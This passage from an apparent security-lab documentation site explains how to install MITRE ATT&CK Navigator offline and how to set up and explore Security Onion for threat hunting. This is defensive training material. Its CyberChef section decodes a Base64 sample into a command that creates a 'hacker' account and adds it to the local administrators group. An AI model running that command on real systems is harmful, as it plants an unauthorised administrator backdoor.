~/mitre-offline/attack-navigator/nav-app/src/assets/enterprise-attack.json\npython3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/mobile-attack.json\npython3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/ics-attack.json\n</code></pre> <p>If the file is valid, this command will output the JSON content. If there are syntax errors, it will display an error message.</p> <p>Modify the\u00a0<code>config.json</code>\u00a0file in\u00a0<code>nav-app/src/assets</code>\u00a0with following contents (change enabled to true, and <code>collection_index_url</code> and <code>data</code> values to <code>assets/index.json</code> and <code>assets/enterprise-attack.json</code> files).</p> <pre><code>nano ~/mitre-offline/attack-navigator/nav-app/src/assets/config.json\n</code></pre> <pre><code>{\n    \"collection_index_url\": \"assets/index.json\",\n\n    \"versions\": {\n        \"enabled\": true,\n        \"entries\": [\n            {\n                \"name\": \"Custom Data v14\",\n                \"version\": \"14\",\n                \"domains\": [\n                    {\n                        \"name\": \"Enterprise\",\n                        \"identifier\": \"enterprise-attack\",\n                        \"data\": [\"assets/enterprise-attack.json\"]\n                    }\n                ]\n            }\n        ]\n    },\n&lt;SNIP&gt;\n</code></pre> <p>Compress the mitre-offline folder for transfer.</p> <pre><code>cd ~/mitre-offline\ntar -czvf mitre-offline.tar.gz *\n</code></pre> <p>Transfer <code>mitre-offline.tar.gz</code> to the air-gapped Ubuntu VM using a USB drive.</p>"},{"location":"navigator/navigator.html#on-the-air-gapped-environment","title":"On the Air-Gapped Environment","text":"<p>On the air-gapped Ubuntu VM, make a directory called mitre-offline and extract the transferred archive.</p> <pre><code>mkdir ~/mitre-offline &amp;&amp; cd ~/mitre-offline\ntar -xzvf ~/mitre-offline.tar.gz\n</code></pre> <p>Install LibreOffice and verify installation.</p> <pre><code>cd ~/mitre-offline/libre\nsudo dpkg -i *.deb\nlibreoffice\n</code></pre> <p>Install Node.js v18 and verify the installation.</p> <pre><code>cd ~/mitre-offline/nodejs\ntar -xvf node-v18.20.6-linux-x64.tar.xz \nsudo mv node-v18.20.6-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Install Angular CLI globally by linking it to the\u00a0<code>npm</code>\u00a0directory. This will create a global symlink for the Angular CLI, allowing you to use the\u00a0<code>ng</code>\u00a0command from anywhere. This process may take some time.</p> <pre><code>cd ~/mitre-offline/angular-cli/node_modules/@angular/cli\nnpm link\n</code></pre> <p>Verify that Angular CLI is installed correctly. This should display Angular CLI version 17 along with other related information.</p> <pre><code>ng version\n</code></pre> <pre><code>     _                      _                 ____ _     ___\n    / \\   _ __   __ _ _   _| | __ _ _ __     / ___| |   |_ _|\n   / \u25b3 \\ | '_ \\ / _` | | | | |/ _` | '__|   | |   | |    | |\n  / ___ \\| | | | (_| | |_| | | (_| | |      | |___| |___ | |\n /_/   \\_\\_| |_|\\__, |\\__,_|_|\\__,_|_|       \\____|_____|___|\n                |___/\n\n\nAngular CLI: 17.3.11\nNode: 18.20.6\nPackage Manager: npm 10.8.2\nOS: linux x64\n\nAngular: undefined\n... \n\nPackage                      Version\n------------------------------------------------------\n@angular-devkit/architect    0.1703.11\n@angular-devkit/core         17.3.11\n@angular-devkit/schematics   17.3.11\n@schematics/angular          17.3.11\n</code></pre>"},{"location":"navigator/navigator.html#run-mitre-attck-navigator","title":"Run MITRE ATT&amp;CK Navigator","text":"<p>Navigate to the\u00a0<code>nav-app</code>\u00a0directory and run the application.</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app\nng serve --host 0.0.0.0\n</code></pre> <p>Open\u00a0<code>http://&lt;IP ADDRESS&gt;:4200</code>\u00a0in your browser. </p> <p></p> <p>Verify that creating new layer loads locally hosted JSON files (enterprise-attack, mobile-attack and ics-attack). </p> <p>Enterprise ATT&amp;CK (enterprise-attack.json)</p> <p></p> <p>Mobile ATT&amp;CK (mobile-attack.json)</p> <p></p> <p>ICS ATT&amp;CK (ics-attack.json)</p> <p></p> <p>Verify that you can also access the Navigator from the Ubuntu VM using the MITRE VM's IP address. Verify access to locally hosted JSON files.</p>"},{"location":"navigator/navigator.html#introduction-to-mitre-attck-navigator","title":"Introduction to MITRE ATT&amp;CK Navigator","text":""},{"location":"navigator/navigator.html#creating-a-new-layer","title":"Creating a New Layer","text":"<p>Navigate to the MITRE ATT&amp;CK Navigator at <code>http://&lt;IP Address&gt;:4200</code>. Select Create New Layer, then choose Enterprise ATT&amp;CK.</p> <p></p> <p>Select Layer Controls, then \"Settings.\" Change the Layer name to \"APT38.\u201d</p> <p></p> <p>Click Selection Controls, then select \"Search &amp; Multiselect.\" Search for APT38. Expand the Threat Groups section and click Select next to APT38. This will automatically select the techniques used by APT38.</p> <p></p>"},{"location":"navigator/navigator.html#manually-setting-colours","title":"Manually Setting Colours","text":"<p>Navigate to Technique Controls, select 'Background Colour,' and choose a colour that is easily identifiable (e.g., red).</p> <p></p> <p>To expand the subtechniques, navigate to Layer Controls, then click \"Expand Subtechniques.\u201d</p> <p></p> <p></p>"},{"location":"navigator/navigator.html#manually-adding-a-ttp","title":"Manually Adding a TTP","text":"<p>First navigate to Selection Controls and click \u201cdeselect 43 techniques.\u201d</p> <p></p> <p>To manually add a Tactic, Technique, or Procedure (TTP), click on the TTP (e.g., Scheduled Task/Job) and select the orange colour.</p> <p></p>"},{"location":"navigator/navigator.html#creating-an-adversary-profile","title":"Creating an Adversary Profile","text":"<p>Create a new layer using Enterprise ATT&amp;CK. Name the layer the Red Haast Eagle (or name of your own choice). </p> <p></p> <p>While holding down the control key, select multiple TTP\u2019s that your adversary profile will be using. You can copy the TTPs shown in the image, or choose your own. </p> <p></p> <p>While the TTPs are selected, navigate to Layer Controls, then Colour Setup. Set High Value to 3 and leave presets set to red to green.</p> <p></p>"},{"location":"navigator/navigator.html#setting-colours-by-assigning-scores-red-team","title":"Setting Colours by Assigning Scores (Red Team)","text":"<p>Navigate to Technique Controls, then Scores. Set the Score value to 0. The score can be defined and interpreted in many different ways. In this scenario, we will be looking at scores from the red team\u2019s planning perspective. A score of 0 means the red team wasn\u2019t successful in executing the following TTPs (shown in red), whereas a score of 3 means the red team was successful in executing the TTPs.</p> <p></p> <p>Select Compromise Accounts and Email Accounts, and set the score to 3. This means the red team was successful in executing the TTPs. This will render these specific TTPs in green.</p> <p></p> <p>Select Command and Scripting Interpreter and PowerShell and assign the score of 1. This implies the TTPs were executed and there were technical errors or TTPs were partially executed. This will render the TTPs in orange.</p> <p></p>"},{"location":"navigator/navigator.html#setting-colours-by-assigning-scores-blue-team","title":"Setting Colours by Assigning Scores (Blue Team)","text":"<p>Create a new layer using Enterprise ATT&amp;CK. Name the layer \"APT41\" and apply the TTPs used by APT41. Navigate to Layer Controls, then Colour Setup. Set High Value to 3 and set Presets to green to red.</p> <p></p> <p>With APT41\u2019s TTPs selected, assign a score of 0. This will render the TTPs in green, indicating that the red team was not successful in executing these TTPs.</p> <p></p> <p>Select Impersonation and File and Directory Discovery and assign the score of 3. This will render the TTPs in red, indicating that the red team was successful in executing these TTPs without being detected by the blue team. </p> <p></p> <p>There are many ways to implement colour coding, and it is up to you to define and interpret it.</p>"},{"location":"navigator/navigator.html#combining-multiple-layers","title":"Combining Multiple Layers","text":"<p>Close all layers. Create a new layer using Enterprise ATT&amp;CK. Name the layer \"APT38\" and apply the TTPs used by APT38. In the Colour Setup in Layer Controls, set the Low value to 1 and the High value to 3. Set the Presets to red to green.</p> <p></p> <p>While the APT38\u2019s TTPs are selected, assign the Score value of 1.</p> <p></p> <p>Create a second layer using Enterprise ATT&amp;CK. Name the layer \"APT41\" and apply the TTPs used by APT41. Set the Low value to 1 and High value to 3. Set the Presets to red to green. Assign the Score value of 1. </p> <p></p> <p>Create a third layer using Enterprise ATT&amp;CK. Name the layer \"APT28\" and apply the TTPs used by APT28. Set the Low value to 1 and High value to 3. Set the Presets to red to green. Assign the Score value of 1. </p> <p></p> <p>Create a new layer to combine the three layers. Select \"Create Layer from Other Layers.\" For Domain, select \"Enterprise ATT&amp;CK MITRE ATT&amp;CK v16.\" For Score Expression, enter \"a+b+c,\" which will combine the scores from the three layers. For Gradient and Colouring, select \"APT38\" (noting that they all use the same gradient and colouring). Click \"Create Layer.\"</p> <p></p> <p>This generates a combined layer. Red indicates a score of 1, meaning that only one APT uses the TTPs in red. Yellow indicates a score of 2, meaning that two APTs use the TTPs in yellow. Green indicates a score of 3, meaning that all three APTs use the TTPs in green.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer","title":"Exporting Layer","text":"<p>Within the Layer Controls tab, select \"Export.\" Selecting Code Blocks will download the layer as a JSON file. Table View will export all layers to Excel, and the Camera icon will render the layer as an SVG.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-code-blocks","title":"Exporting Layer to Code Blocks","text":"<p>Within the Layer Controls tab, select \"Export\u201d then \u201cCode Blocks.\u201d This will automatically download the layer as JSON file. </p> <p></p> <p>Open a new tab and select Open Existing Layer. Select Upload from local and select the downloaded JSON file. </p> <p></p> <p>This loads the combined layer we created earlier. </p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-table-view","title":"Exporting Layer to Table View","text":"<p>Within the Layer Controls tab, select \"Export\u201d then \u201cTable View.\u201d This will automatically download the layer as XLSX file. </p> <p></p> <p>Open the XLSX file in LibreOffice. This will display the three APT layers and the combined layer with the same colour rendering.</p> <p></p>"},{"location":"navigator/navigator.html#exporting-layer-to-svg","title":"Exporting Layer to SVG","text":"<p>Within the Layer Controls tab, select \"Export\u201d then camera icon\u201d This will render layer to  Scalable Vector Graphics (SVG) file. An SVG file is a type of image that uses XML code to create two-dimensional graphics. Unlike PNG or JPG images, which can become blurry when resized, SVG images stay clear and sharp at any size. This makes them great for things like websites, logos, and diagrams. Click \u201cDownload SVG\u201d button.</p> <p></p> <p>This will automatically download the SVG file.</p> <p></p> <p>Double-click the downloaded SVG file. This will open the SVG file in a new tab in your web browser.</p> <p></p>"},{"location":"navigator/navigator.html#references","title":"References","text":"<ul> <li>https://attack.mitre.org/</li> <li>https://github.com/mitre-attack/attack-navigator</li> <li>https://www.youtube.com/watch?v=78RIsFqo9pM</li> <li>https://youtu.be/hN_r3JW6xsY?si=xer1ygx-pGLIJnI6</li> </ul>"},{"location":"securityonion/securityonion.html","title":"Security Onion","text":""},{"location":"securityonion/securityonion.html#security-onion","title":"Security Onion","text":"<p>Security Onion is a free and open-source platform developed to help defenders monitor and investigate both network and host activity. It includes tools for packet capture, intrusion detection, log management, and case tracking.</p>"},{"location":"securityonion/securityonion.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Security Onion was installed in Standalone mode, and the Elastic Agent was installed on the Windows virtual machine (VM). Test data was ingested, and threat hunting was carried out in a safe, controlled environment.</p> Hostname OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.18 (WAN) / 10.0.0.1 (LAN) so-standalone Oracle Linux Server 9.6 Security Onion Manager (Standalone) 10.0.0.100 WS2019 Windows Server 2019 Elastic Agent (Security Onion Client) 10.0.0.35 <p></p>"},{"location":"securityonion/securityonion.html#installing-security-onion-manager-standalone","title":"Installing Security Onion Manager (Standalone)","text":"<p>This section explains how to set up the Security Onion Manager in Standalone mode using VMware Workstation.</p> <p>Head over to the official Security Onion download page and download the ISO file for the latest release.</p> <p>Open VMware Workstation and select Create New Virtual Machine. Choose Typical and click Next.</p> <p></p> <p>Select I will install the Operating System (OS) later.</p> <p></p> <p>For Guest operating system, select Linux and Oracle Linux 9 (64-bit). </p> <p></p> <p>Enter the Virtual machine name (e.g., SecOnion) and choose where to save it.</p> <p></p> <p>Set the disk size to at least 200 GB. </p> <p></p> <p>Click Customise Hardware:</p> <ul> <li>Memory: Set to 16 GB</li> <li>Processors: Set to 4</li> <li>Under CD/DVD, choose Use ISO image file and browse to the Security Onion ISO you downloaded.</li> <li>Add two network adapters:<ul> <li>One connected to your FortiGate VM or LAN (e.g., LAN Segment)</li> <li>One for NAT or Bridged (this gives access to Internet to download required packages)</li> </ul> </li> <li>Click Close and then Finish to create the VM.</li> </ul> <p>Refer to the Hardware Requirements page and select network adapters appropriate for your setup. </p> <p></p> <p></p> <p>Power on the VM. When the menu appears, select Install Security Onion (top option).</p> <p></p> <p>The VM will go through initialisation process (automated script). </p> <p></p> <p>When prompted for warning, type yes to proceed. When prompted to create administrator account, create a username and password. For example:</p> <pre><code>administrator: soc-admin\npassword: password\n</code></pre> <p>Security Onion will continue with the installation.</p> <p></p> <p>If Security Onion install is stuck at Downloading packages, it may be due to a network issue. To check, navigate to the shell:</p> <pre><code>Alt + F2\n</code></pre> <p>Check your network interface (e.g., ens160). If it has no IP, it is not connected. </p> <pre><code>ip a\n</code></pre> <p></p> <p>In this case:</p> <ul> <li>My VM interface <code>ens160</code> is detected and up, but it has no IP address assigned.</li> <li><code>dhclient</code> is not available (missing in this minimal Oracle Linux install).</li> <li>The <code>nmcli</code> output shows <code>ens160</code> is not attached to any connection profile, which means no network configuration is active.</li> </ul> <p>To manually set up networking:</p> <pre><code>nmcli con add type ethernet ifname ens160 con-name ens160 autoconnect yes ipv4.method auto\nnmcli con up ens160\n</code></pre> <p>Then check IP and test internet connectivity:</p> <pre><code>ip a\nping 8.8.8.8\n</code></pre> <p></p> <p>To return to the installer screen, switch back to the main screen</p> <pre><code>Alt + F1\n</code></pre> <p>Once network access is working, the installer will proceed with downloading necessary packages. This part can take a while depending on your connection.</p> <p></p> <p></p> <p>When prompted, press Enter to reboot.</p> <p></p> <p>After reboot, login using the administrator credentials you created earlier.</p> <p></p> <p>After logging in, you will see a prompt asking if you want to proceed. Select Yes.</p> <p></p> <p>Choose Install to begin the configuration process.</p> <p></p> <p>Select Standalone when asked for deployment type. </p> <p></p> <p>Type AGREE to accept the Elastic Licence version 2.</p> <p></p> <p>If your VM can access the internet, choose Standard. If you are installing in an offline or air-gapped environment, choose Airgap (as used in this guide).</p> <p></p> <p>Give your system a hostname. This will identify your Security Onion node. For example:</p> <pre><code>so-standalone\n</code></pre> <p></p> <p>You can add a short description for this node, but it is not required. Feel free to leave it blank.</p> <p></p> <p>Choose the network adapter that connects to your LAN or firewall. In this example, it is ens160.</p> <p></p> <p>Select Static IP address for your management interface.</p> <p></p> <p>Note that this is the static IP address for your network interface not the VM itself. Earlier, the VM was assigned DHCP IP address of 10.0.0.21. The static IP address must be in the same subnet but the last octet can be different. </p> <p>Assign 10.0.0.100/24 to the network interface.</p> <p></p> <p>Enter your gateway\u2019s IP address. Note this will be different in your setup. </p> <p></p> <p>Enter your DNS servers. This will be automatically populated.</p> <p></p> <p>Enter a generic value like so.lab for your DNS search domain.</p> <p></p> <p>When asked whether to keep the default Docker IP range, select Yes.</p> <p></p> <p>Choose the second network adapter for packet monitoring. In this case, ens192 (NAT network).</p> <p></p> <p>Create an administrator account in email address format for the Security Onion Console (SOC) web interface. It can be a made up email address. Take a note of this email address.</p> <p></p> <p>Enter a password for the administrator account.</p> <p></p> <p>Re-enter the password.</p> <p></p> <p>Select IP to access the web interface. </p> <p></p> <p>Select Yes to allow access to this Security Onion installation via the web interface. </p> <p></p> <p>Enter the 10.0.0.0/24 to allow access from this subnet. Note your network setup may be different so verify your subnet. </p> <p></p> <p>Review your settings. If everything looks right, select Yes to proceed.</p> <p></p> <p>Security Onion will now run an automated configuration script. This may take 10\u201330 minutes depending on your system.</p> <p></p> <p>After installation is complete, you can access the SOC web interface by navigating to <code>https://10.0.0.100</code>.</p> <p></p> <p>Verify that all containers are running by entering the following command on the terminal of the Security Onion VM:</p> <pre><code>sudo so-status\n</code></pre> <p></p>"},{"location":"securityonion/securityonion.html#accessing-soc-web-interface","title":"Accessing SOC Web Interface","text":"<p>From the WS2019 VM, open a web browser and navigate to <code>https://10.0.0.100</code>. When prompted for a warning, click Advanced then select Accept the Risk and Continue.</p> <p></p> <p>Login to SOC web interface using the administrator credentials.</p> <p></p> <p>Navigate to Grid page and verify that all containers are running on the Security Onion Manager. </p> <p></p>"},{"location":"securityonion/securityonion.html#configuring-security-onion-firewall","title":"Configuring Security Onion Firewall","text":"<p>To allow the agent to connect through the firewall, navigate to Administration \u2192 Configuration.</p> <p>Select the quick link Allow Elastic Agent endpoints to send logs. This will automatically select firewall \u2192 hostgroups \u2192 elastic_agent_endpoint. Add *the agent\u2019s subnet. Click the *green checkmark to apply changes.  Note that the changes typically apply within 15 minutes.</p> <p></p> <p></p> <p>Click on Options and Synchronize Grid to push out changes. Please note that this can take several minutes to complete.</p> <p></p>"},{"location":"securityonion/securityonion.html#deploying-elastic-agent-on-windows","title":"Deploying Elastic Agent on Windows","text":"<p>After waiting for several minutes, verify connection to 10.0.0.100 on port 8220 by running the following command in PowerShell from your Windows VM. </p> <pre><code>Test-NetConnection 10.0.0.100 -Port 8220\n</code></pre> <p></p> <p>You should see True for TcpTestSucceeded.</p> <p>Navigate to the Downloads page and download the Windows Elastic agent (exe).</p> <p></p> <p>Note Sysmon has been installed and configured on the WS2019 VM. If you would like to ingest Sysmon logs, install and configure Sysmon on yours Windows VM before proceeding to the next step. </p> <p>Right-click on the elastic agent and click Run as administrator.</p> <p></p> <p>If Microsoft Defender SmartScreen prevents you from running the agent, click More info \u2192 Run anyway.</p> <p></p> <p>Installation will be initiated. </p> <p></p> <p>After installation is complete, check the Elastic agent installer log. </p> <p></p> <p>You should see Elastic Agent has been successfully installed and Elastic Agent Installation completed.</p> <p></p> <p>If you encounter an error, try installing the Elastic agent again. If the error persists, refer to the Security Onion documentation for troubleshooting.</p> <p>By default, Security Onion\u2019s Fleet agent policies include integrations that collect Windows event logs from key channels such as PowerShell, ForwardedEvents, and Sysmon Operational.</p> <p>You can check agent policies by navigating to Elastic Fleet \u2192 Agent policies \u2192 endpoints-initial \u2192 windows-endpoints.</p> <p></p>"},{"location":"securityonion/securityonion.html#checking-host-logs-in-dashboard","title":"Checking Host Logs in Dashboard","text":"<p>To verify that host logs are being ingested, navigate to the Dashboards page and select Host Overview on SOC web interface. </p> <p></p> <p>This gives us high-level view of host logs that are being ingested via Elastic agent. We see Sysmon logs and Windows event logs being ingested from the host WS2019.</p> <p></p>"},{"location":"securityonion/securityonion.html#introduction-to-security-onion","title":"Introduction to Security Onion","text":"<p>This documentation is based on content from the Security Onion Essentials course by Security Onion Solutions. Some examples have been adapted to reflect my lab setup, which uses Standalone mode instead of Evaluation mode. </p>"},{"location":"securityonion/securityonion.html#analyst-tools","title":"Analyst Tools","text":""},{"location":"securityonion/securityonion.html#overview","title":"Overview","text":"<p>On the Overview page, you\u2019ll find a silhouette icon in the top-right corner of the SOC interface. Clicking this opens up options like Dark Mode, the Cheat Sheet, the Blog, and your Account Settings.</p> <p>Tip: Both the Cheat Sheet and the Security Onion documentation are available offline, so you can still access them even without an internet connection. </p> <p></p> <p>The Cheat Sheet is a handy reference that lists commonly used commands for day-to-day tasks in Security Onion.</p> <p></p> <p>In the Account Settings menu, go to the Security tab to update your password or set up Multi-Factor Authentication (MFA) using Time-based One-Time Passwords (TOTP).</p> <p></p>"},{"location":"securityonion/securityonion.html#grid","title":"Grid","text":"<p>The Grid displays all the nodes that have been deployed in your Security Onion setup. In this example, there is only one node (so-standalone) listed. </p> <p></p> <p>Clicking on the node will reveal more information, including the status of the node itself and the containers running on it.</p> <p></p> <p>At the bottom of the Node Status panel, you\u2019ll see five icons. From right to left:</p> <ul> <li>The help icon opens documentation for the Grid interface.</li> <li>The power button lets you reboot the node.</li> <li>The upload icon allows you to manually import files such as PCAPs or EVTX logs.</li> <li>The test data icon lets you simulate sample alerts and logs.</li> <li>The node status icon gives a detailed overview of the node\u2019s current state.</li> </ul> <p>Click the test data icon to load example data into Security Onion for testing.</p> <p></p> <p>This will load sample test data into Security Onion for demonstration purposes. When prompted, click Yes to proceed. Please note that this can take several minutes to complete.</p> <p></p> <p>If you would like to import your own PCAP, download a sample, for example, **2025-01-28-web-inject-and-malware-infection.pcap. Then click the upload** icon and select the PCAP file to upload it into Security Onion.</p> <p></p>"},{"location":"securityonion/securityonion.html#alerts","title":"Alerts","text":"<p>Go to the Alerts tab in the SOC interface. This is where you will find alerts for suspicious or potentially malicious activities in your environment.</p> <p>It does not matter whether the alert comes from a Suricata, Sigma, or Yara rule. If the alert is triggered, it will show up here. By default, alerts are grouped by rule name. For example, you might see 11 alerts under the rule ET P2P BitTorrent Peer Sync.</p> <p>Emerging Threats (ET) is a well-known set of intrusion detection rules. It is developed and maintained by the community (and by Proofpoint for the commercial version) and helps detect a wide variety of network-based threats. </p> <p></p> <p>To look more closely at individual alerts, click on the number next to the rule name.</p> <p>You will also see a few icons next to each alert:</p> <ul> <li>The bell icon is used to acknowledge the alert - this hides it from the main view but does not delete it.</li> <li>The triangle icon is used to escalate the alert into a case for further investigation.</li> </ul> <p>To escalate, simply click the triangle and choose Escalate to new case.</p> <p></p> <p>You can also fine-tune how a rule behaves by clicking on the rule name and selecting Tune Detection from the menu.</p> <p></p> <p>This opens the Tune Detection page, where you can enable or disable the rule, or adjust its settings to better suit your environment.</p> <p></p>"},{"location":"securityonion/securityonion.html#cases","title":"Cases","text":"<p>Go to the Cases tab in the SOC interface. You will see any cases that have been created, usually named after the alert that was escalated.</p> <p></p> <p>As you investigate, you can record notes and observations to track what triggered the alert. Click on the binoculars icon to open the case and add your comments or findings.</p> <p></p>"},{"location":"securityonion/securityonion.html#hunt","title":"Hunt","text":"<p>Head over to the Hunt tab in the SOC interface. The Hunt tool is built to be a fast, flexible workspace for analysts to dig into data during investigations.</p> <p></p> <p>At the top of the Hunt page, you will find a query box, along with a list of prebuilt queries you can use straight away. You can also create your own custom queries tailored to your environment and use cases.</p> <p></p> <p>For example, the Log Type query shows all the different types of logs that Security Onion has collected. These logs are grouped into datasets based on the type of data and its source.</p> <p></p> <p>If you want to focus your hunt on Sysmon logs, click on windows and select Include to add it to your search query.</p> <p></p> <p>You will now notice that the Group Metrics pane is filtered to show only records from the windows dataset.</p> <p></p> <p>To narrow it down even more, you can select windows.sysmon_operational and click Include to filter specifically for Sysmon operational logs.</p> <p></p> <p>Now, the Group Metrics pane shows only data from the windows.sysmon_operational dataset.</p> <p></p> <p>Scrolling down, you will see a list of individual Sysmon events that have been captured.</p> <p></p> <p>You can click to expand any event to view detailed information about what was captured in that specific log entry.</p> <p></p> <p>To refine the results even further and focus on FileCreate events, click on FileCreate and select Include to filter for those specific logs.</p> <p></p>"},{"location":"securityonion/securityonion.html#dashboards","title":"Dashboards","text":"<p>Go to the Dashboards tab in the SOC interface. Dashboards include a range of prebuilt visualisations, organised by different data sets to help you quickly interpret and analyse incoming logs.</p> <p></p> <p>For example, if you want to analyse HTTP traffic, you can select HTTP from the drop-down menu to load the relevant dashboard.</p> <p></p> <p>This will load a prebuilt HTTP dashboard that provides visual insights and metrics related to HTTP traffic observed in your environment.</p> <p></p> <p>You can refine your view by filtering based on destination port. For instance, if you want to focus on non-standard HTTP traffic, you can Exclude destination port 80 from the results.</p> <p></p> <p>You will now see HTTP traffic that is using non-standard ports, which could indicate unusual or suspicious behaviour.</p> <p></p> <p>Security Onion also captures full network traffic using packet capture (PCAP). To view a packet capture:</p> <ul> <li>Scroll down to the event list</li> <li>Click on the first record</li> <li>Select Actions, then click on PCAP to open the capture for that specific network flow.</li> </ul> <p></p> <p>This opens a web-based PCAP viewer, similar to Wireshark, but accessible through your browser. Here, you can inspect details like the source and destination IPs, port numbers, and TCP flags involved in the connection.</p> <p></p> <p>To view the raw packet data, click on the list icon at the top of the PCAP interface.</p> <p></p> <p>To hide the hex dump and switch to a plain-text view of the TCP session, click on the HEX icon at the top of the interface.</p> <p></p> <p>If you need to dig deeper, you can either download the PCAP using the Download PCAP button at the top right, or send it directly to CyberChef by clicking the CyberChef icon.</p> <p></p>"},{"location":"securityonion/securityonion.html#pcap","title":"PCAP","text":"<p>As well as pivoting into a PCAP from a specific alert or event, you can also pull custom PCAPs from your sensors based on your own search criteria.</p> <p>To do this:</p> <ol> <li>Go to the PCAP tab in the SOC interface.</li> <li>Click the + icon to create a new request.</li> <li>Enter the parameters you want to filter by (e.g. IP address, port, time range).</li> <li>Specify the sensor ID you want to collect from.</li> </ol> <p>Security Onion will then retrieve the matching packets and display them in the PCAP web interface for review.</p> <p></p>"},{"location":"securityonion/securityonion.html#downloads","title":"Downloads","text":"<p>Go to the Downloads tab in the SOC interface. Here, you can download the Elastic Agent that matches the operating system of your endpoint.</p> <p>These agents are designed to collect telemetry data from the host and send it to Security Onion. They are prebuilt and automatically configured for your environment as part of the installation process.</p> <p></p>"},{"location":"securityonion/securityonion.html#administration","title":"Administration","text":"<p>Head to the Administration tab in the SOC interface. This section lets you manage and configure your Security Onion Grid.</p> <p>Under Users, you can create, disable, or edit user accounts for accessing the SOC web interface.</p> <p></p> <p>The Grid Members section is used to add or remove nodes from your Security Onion deployment, allowing you to scale or manage your environment as needed</p> <p></p> <p>The Configuration section provides access to various platform settings, including options for updating firewall rules and adjusting log retention periods to suit your environment.</p> <p></p> <p>The License Key section is used to activate certain advanced enterprise features (also known as Pro features) that aren\u2019t available in the free version.</p> <p></p>"},{"location":"securityonion/securityonion.html#kibana","title":"Kibana","text":"<p>Kibana is Elastic\u2019s web-based interface for exploring and visualising data stored in Elasticsearch. Security Onion includes a range of ready-to-use Kibana dashboards to help you analyse this data in more depth.</p> <p>Clicking on Kibana from the SOC interface will open it in a new browser tab.</p> <p>To focus on specific data, for example, HTTP logs, click Network under the Event Category, then choose HTTP under Datasets.</p> <p></p> <p></p> <p>You will now see detailed tables and visualisations specifically related to HTTP data, similar to what you would find in the SOC Dashboards.</p> <p>Individual events appear at the bottom of the page.</p> <p>Whether you are using SOC or Kibana, you are viewing data from the same underlying Elasticsearch database. It is just presented through different interfaces. </p> <p></p> <p></p>"},{"location":"securityonion/securityonion.html#elastic-fleet","title":"Elastic Fleet","text":"<p>Elastic Fleet is where you manage and configure your Elastic Agents.</p> <p>Clicking on Elastic Fleet in the SOC interface opens it in a new tab. You\u2019ll see a list of registered agents, for example, <code>WS2019</code>, <code>so-standalone</code>, and <code>FleetServer-so-standalone</code>. These represent the hosts currently enrolled and reporting data to Security Onion.</p> <p></p>"},{"location":"securityonion/securityonion.html#osquery-manager","title":"Osquery Manager","text":"<p>The Osquery Manager lets you send live Osquery to endpoints where Elastic Agents are installed. Originally developed by Facebook, Osquery treats endpoints like databases, allowing you to run structured queries against them.</p> <p>Clicking on Osquery Manager in SOC opens it in a new tab. To get started, click New live query.</p> <p></p> <p>For example, if you want to gather a list of all user accounts across the machines in your network, you can run this Osquery across all agents:</p> <p>For Query type, select Single query. For Agents, select All agents. For Query, enter the following query and click Submit.</p> <pre><code>select * from users;\n</code></pre> <p></p> <p>Security Onion will then contact all selected agents and request user account information regardless of what operating system each endpoint is running.</p> <p></p>"},{"location":"securityonion/securityonion.html#influxdb","title":"InfluxDB","text":"<p>InfluxDB shows similar information to what you see on the Grid screen, but with one key difference - it provides historical telemetry, not just real-time status. This is especially useful for spotting trends, such as changes in CPU usage over time.</p> <p>You can open InfluxDB by clicking InfluxDB in the SOC menu, or by clicking the node status icon at the bottom of the Node Status pane in the Grid view. Both will open it in a new tab.</p> <p></p> <p></p>"},{"location":"securityonion/securityonion.html#cyberchef","title":"CyberChef","text":"<p>CyberChef is a browser-based tool used for encoding, decoding, and analysing data. It is especially useful for tasks like decoding Base64, converting binary, or analysing encoded payloads in threat investigations.</p> <p></p> <p>Copy and paste the following string into the Input box:</p> <pre><code>bgBlAHQAIAB1AHMAZQByACAAaABhAGMAawBlAHIAIABQAGEAcwBzAHcAMAByAGQAIQAgAC8AYQBkAGQAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGgAYQBjAGsAZQByACAA\n</code></pre> <p>Drag and drop From Base64 and Decode text into the Recipe panel from the Operations list. For Decode text, select the UTF-16LE encoding. You should now see the decoded command in the Output. The command appears to show the attacker adding themselves to the local administrators group.</p> <pre><code>net user hacker Passw0rd! /add; net localgroup administrators hacker\n</code></pre> <p></p>"},{"location":"securityonion/securityonion.html#navigator","title":"Navigator","text":"<p>The Navigator in Security Onion is a visual tool built on the MITRE ATT&amp;CK framework, showing which attacker techniques your environment is currently able to detect.</p> <p>It does this by mapping your enabled Sigma rules to specific ATT&amp;CK techniques, with colour coding used to indicate which areas are covered. </p> <p>As you enable more rules, the chart updates automatically helping you spot any gaps in your detection coverage at a glance.</p> <p></p>"},{"location":"securityonion/securityonion.html#updating-security-onion","title":"Updating Security Onion","text":"<p>The easiest way to check for Security Onion updates is by visiting the Security Onion Blog, which you can access from the Overview tab in the SOC interface.</p> <p></p> <p></p> <p></p> <p>You can also keep an eye on Security Onion\u2019s social media channels for update announcements. These usually include a direct link to the Release Notes.</p> <p>To install updates, Security Onion provides a built-in tool called Security Onion Updater, or soup for short.</p>"},{"location":"securityonion/securityonion.html#updating-security-onion-with-internet-access","title":"Updating Security Onion with Internet Access","text":"<p>If you chose the standard install from the Security Onion ISO and your system has internet access, the underlying Oracle Linux OS will automatically check for and apply updates every eight hours by default.</p> <p>If you would like to change this schedule, you can do so in the SOC interface by navigating to:</p> <p>Administration \u2192 Configuration \u2192 patch \u2192 os \u2192 schedules \u2192 auto \u2192 schedule \u2192 hours.</p> <p></p> <p>Open the local console for your Standalone Security Onion VM and log in with your administrator credentials. To check the current status of the platform, run:</p> <pre><code>sudo so-status\n</code></pre> <p></p> <p>If any of the containers are showing as missing or failed, you will need to resolve those issues before continuing with the update.</p> <p>To check the current version of Security Onion, run:</p> <pre><code>cat /etc/soversion\n</code></pre> <p></p> <p>In this 